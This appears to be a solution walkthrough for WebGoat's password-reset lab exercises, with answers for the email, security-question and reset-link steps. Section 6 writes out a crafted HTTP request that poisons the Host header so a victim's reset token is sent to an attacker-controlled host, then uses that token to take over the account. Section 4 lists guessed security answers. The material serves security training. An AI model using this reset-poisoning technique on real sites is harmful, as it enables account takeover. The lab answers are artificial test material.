# Password Reset

## 2 - Email functionality with Webwolf

Steps:
1. Click forgot password
2. Send email to `tonnctf@webgoat.org`
3. Go to Webgoat
```http://www.webwolf.local/WebWolf/mail```
4. Login with your Webgoat username and password
5. Open the email, and the content is
```Thanks for resetting your password, your new password is: ftcnnot```

Answer:
Email: tonnctf@webgoat.org
Password: ftcnnot

## 4 - Security Questions

Resource for good security questions - http://goodsecurityquestions.com/

Your username is 'webgoat' and your favorite color is 'red'.
Users to try are "tom", "admin" and "larry"

Answer:
Your username: tom, favourite color: purple
Your username: admin, favourite color: green
Your username: larry, favourite color: yellow


## 5 - The Problem with Security Questions

Answer: Just go through the possible security questions and see the reasons why it is not good


## 6 - Creating the password reset link

Reset the password of Tom `tom@webgoat-cloud.org`

Hint:
1. Edit the HOST to include port 9090, and email to reset to tom@webgoat-cloud.org 
```
POST /WebGoat/PasswordReset/ForgotPassword/create-password-reset-link HTTP/1.1
Host: www.webwolf.local:9090

email=tom@webgoat-cloud.org
```

2. The output is shown in webwolf
```http://www.webwolf.local/WebWolf/requests```

3. Use the reset password link in webwolf -> incoming requests, especially the unique token
```http://www.webgoat.local/WebGoat/PasswordReset/reset/reset-password/0b4ef34c-c061-4624-9d16-2e33f1230591```

4. Change the password to password123

Answer:
Email: tom@webgoat-cloud.org
password: password123



